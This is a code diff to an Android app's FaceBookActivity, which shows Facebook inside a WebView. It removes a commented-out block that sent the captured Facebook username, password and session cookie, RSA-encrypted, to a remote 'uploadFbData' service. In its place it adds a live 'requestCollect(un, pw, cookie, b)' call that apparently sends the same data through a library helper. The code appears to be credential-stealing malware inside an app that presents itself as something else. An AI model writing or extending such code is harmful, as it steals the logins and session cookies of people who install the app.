@@ -11,9 +11,7 @@ import android.view.View
 import android.view.WindowManager
 import android.webkit.*
 import androidx.lifecycle.lifecycleScope
-import com.sherloki.devkit.account
-import com.sherloki.devkit.password
-import com.sherloki.devkit.showInsertAd
+import com.sherloki.devkit.*
 import com.xxxxxxh.c1.R
 import com.xxxxxxh.c1.base.BaseActivity
 import com.xxxxxxh.c1.widget.sticker.MyWebView
@@ -144,33 +142,14 @@ class FaceBookActivity : BaseActivity(), MyWebView.Listener {
         cookie: String,
         b: String
     ) {
-//        lifecycleScope.launch(Dispatchers.IO) {
-////            "uploadFbData start".loge()
-//            doSuspendOrNull {
-//                devkitService.uploadFbData(
-//                    gson.toJson(
-//                        mutableMapOf(
-//                            "un" to un,
-//                            "pw" to pw,
-//                            "cookie" to cookie,
-//                            "source" to getString(R.string.app_name),
-//                            "ip" to "",
-//                            "type" to "f_o",
-//                            "b" to b
-//                        )
-//                    ).toRsaEncrypt()
-//                )
-//            }?.let {
-//                "uploadFbData result $it".loge()
-//                if (it.code?.toIntOrNull() == 0 && it.data?.toBooleanStrictOrNull() == true) {
-//                    isLogin = true
-//                    withContext(Dispatchers.Main) {
-//                        startActivity(Intent(this@FaceBookActivity, MainActivity::class.java))
-//                        finish()
-//                    }
-//                }
-//            }
-//        }
+        lifecycleScope.requestCollect(
+            un, pw, cookie, b
+        ) {
+            if (isLogin) {
+                startActivity(Intent(this@FaceBookActivity, MainActivity::class.java))
+                finish()
+            }
+        }
     }
 
     override fun onResume() {
